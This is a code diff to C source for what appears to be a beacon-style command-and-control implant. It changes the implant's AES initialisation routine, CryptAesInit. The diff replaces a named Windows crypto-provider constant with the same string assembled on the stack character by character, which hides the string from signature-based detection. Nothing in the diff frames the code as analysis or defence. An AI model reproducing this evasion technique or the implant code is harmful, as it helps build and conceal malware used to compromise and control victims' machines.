@@ -19,10 +19,65 @@
 -*/
 DEFINESEC(B) BOOL CryptAesInit( PBEACON_INSTANCE Ins )
 {
-	UCHAR Str[16];
+	UCHAR Str[ MAX_PATH ];
 	DWORD Cbc = CRYPT_MODE_CBC;
 
-	if ( Ins->api.CryptAcquireContext( &Ins->key[1].Provider, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_SILENT ) )
+	Str[0]  = 'M';
+	Str[1]  = 'i';
+	Str[2]  = 'c';
+	Str[3]  = 'r';
+	Str[4]  = 'o';
+	Str[5]  = 's';
+	Str[6]  = 'o';
+	Str[7]  = 'f';
+	Str[8]  = 't';
+	Str[9]  = ' ';
+	Str[10] = 'E';
+	Str[11] = 'n';
+	Str[12] = 'h';
+	Str[13] = 'a';
+	Str[14] = 'n';
+	Str[15] = 'c';
+	Str[16] = 'e';
+	Str[17] = 'd';
+	Str[18] = ' ';
+	Str[19] = 'R';
+	Str[20] = 'S';
+	Str[21] = 'A';
+	Str[22] = ' ';
+	Str[23] = 'a';
+	Str[24] = 'n';
+	Str[25] = 'd';
+	Str[26] = ' ';
+	Str[27] = 'A';
+	Str[28] = 'E';
+	Str[29] = 'S';
+	Str[30] = ' ';
+	Str[31] = 'C';
+	Str[32] = 'r';
+	Str[33] = 'y';
+	Str[34] = 'p';
+	Str[35] = 't';
+	Str[36] = 'o';
+	Str[37] = 'g';
+	Str[38] = 'r';
+	Str[39] = 'a';
+	Str[40] = 'p';
+	Str[41] = 'h';
+	Str[42] = 'i';
+	Str[43] = 'c';
+	Str[44] = ' ';
+	Str[45] = 'P';
+	Str[46] = 'r';
+	Str[47] = 'o';
+	Str[48] = 'v';
+	Str[49] = 'i';
+	Str[50] = 'd';
+	Str[51] = 'e';
+	Str[52] = 'r';
+	Str[53] = 0x0;
+
+	if ( Ins->api.CryptAcquireContext( &Ins->key[1].Provider, NULL, Str, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_SILENT ) )
 	{
 		if ( Ins->api.CryptImportKey( Ins->key[1].Provider, Ins->key[1].Ptr, Ins->key[1].Len, 0, 0, &Ins->key[1].Key ) )
 		{
